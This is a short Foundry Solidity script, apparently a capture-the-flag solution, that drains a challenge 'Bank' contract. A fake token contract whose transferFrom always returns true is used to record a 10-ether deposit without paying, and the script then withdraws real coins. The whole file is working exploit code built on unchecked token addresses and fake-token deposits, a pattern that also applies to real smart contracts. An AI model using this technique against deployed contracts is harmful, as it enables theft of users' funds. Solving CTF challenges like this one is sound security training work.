pragma solidity 0.8.28;

import "forge-std/Script.sol";

interface ISetup {
    function coin() external view returns (address);
    function bank() external view returns (address);
    function isSolved() external view returns (bool);
}

interface IBank {
    function depositFor(address _coin, address receiver, uint amount) external;
    function withdraw(address _coin, uint amount) external;
}

contract Solve is Script {
    function run() public {
        ISetup setup = ISetup(vm.envAddress("SETUP"));
        IBank bank = IBank(setup.bank());
        address coin = setup.coin();

        vm.startBroadcast(vm.envUint("PRIV"));
        address user = vm.addr(vm.envUint("PRIV"));

        HackCoin exploit = new HackCoin();

        bank.depositFor(address(exploit), user, 10 ether);
        bank.withdraw(coin, 10 ether);

        require(setup.isSolved());
        vm.stopBroadcast();
    }
}

contract HackCoin {
    function transferFrom(
        address from,
        address to,
        uint amount
    ) public returns (bool) {
        return true;
    }
}
